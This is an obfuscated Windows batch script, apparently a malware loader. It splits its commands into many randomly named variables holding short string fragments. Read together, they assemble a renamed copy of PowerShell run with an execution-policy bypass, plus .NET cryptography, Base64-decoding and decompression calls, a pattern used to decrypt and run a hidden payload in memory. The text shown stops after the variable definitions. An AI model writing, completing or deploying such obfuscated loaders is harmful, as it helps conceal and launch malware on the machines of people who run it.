@echo off
set "riViOxkCmu=ll"
set "IACwUkqZLJ=he"
set "XlqygZRssE=he"
set "JDJDfiSmxk=1."
set "PDnICmiwYP=rs"
set "wxSjpzgqCY=in"
set "wqIJgKBrJj=\W"
set "IomDpIPoow=Wi"
set "xhJSgFPpYo=\v"
set "IuJrvPkKWW=we"
set "uMFyItFunI=:\"
set "GgshVhQgxn=s\"
set "kWDTpcLpZs=ow"
set "dtpgmeiblN=Po"
set "HHVpBHHeTf= /"
set "vSwMcUwsjJ=co"
set "vcKNWPKzOq= C"
set "lWEaxMKsnn=st"
set "ZyEahYuEsI=rS"
set "stLBrkLBqa=xe"
set "ylZmTqHEZz=0\"
set "CblBnOKlpZ=32"
set "bycoRHRFOf=ws"
set "XApVPFLZpJ=em"
set "vbawazZnUS=we"
set "bFkDyDBjOA=y "
set "EGfXNkKcNJ=do"
set "ruJgKFwcOY=.e"
set "OqOHMlBGPE=py"
set "ZvlsDpFuHp=Sy"
set "MegkRshJPn=nd"
set "iJLrlAQJqp=po"
set "cIRaaHPLTb=ll"
set "dUpEtlrpLz= %~dp0"
set "VwOVGXpbSK=cd"
set "wFaCRpXhJg=th('"
set "CdmFXHyYGr=hy.A"
set "AftMARbGfs=wD.T"
set "gigPgyDxBA=0O+g"
set "RloXWXfPXl=mory"
set "NhZVTxXVkM=ptor"
set "mKmurDANDG=F'[-"
set "elpENknAPv=.Len"
set "KQcGqUUPkB=qC ="
set "PJlcbdDONV=in $"
set "tvENixcsXt=$lbg"
set "oQVhHnaZew=ck($"
set "NVgtQAbpbl=nHXs"
set "zMliNnvPnn=pres"
set "UYWNgnWcEP=w) {"
set "GvivnGflwj='[-1"
set "uqNqTOHiBa=)($n"
set "BvGCEVwJjG=ert]"
set "TPaKrCUjcm=();$"
set "HSMRnvpvYo=ecry"
set "hbydhDlNxY=yste"
set "rsxmFbRcJP=oL'["
set "puVuwWfgQi=rity"
set "hCGYQpXKKg=.Con"
set "HgvbpkjubP=HXsJ"
set "JBZXCLwmvP='gni"
set "xWkVhgSBSS=rofi"
set "rtNuIrOuIA=Obje"
set "bsfbPTqDuY=ke($"
set "FMpXmZDjPQ=H.En"
set "mTkBIySLlW=-ep "
set "mWdNPKsHcL=g = "
set "IBdlDShQmB=Syst"
set "KMVivvRvUR=[IO."
set "zpusNQazuc=sion"
set "xGjWKrbrSx=ptog"
set "eRbDWISGNI=raph"
